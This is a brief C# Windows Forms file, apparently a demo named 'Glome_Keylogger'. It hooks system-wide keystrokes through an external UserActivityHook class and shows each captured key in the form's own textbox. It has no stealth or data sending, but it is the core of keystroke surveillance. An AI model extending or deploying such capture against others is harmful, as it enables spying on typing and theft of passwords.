using Snippets;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Glome_Keylogger
{
    public partial class Form1 : Form
    {

        UserActivityHook hook;
        string log = string.Empty;

        public Form1()
        {
            InitializeComponent();
            hook = new UserActivityHook();
            hook.KeyUp += (s, e) =>
               {
                   log += e.KeyData.ToString() + " ";
                   textBox1.Text = log;
               };
        }
    }
}
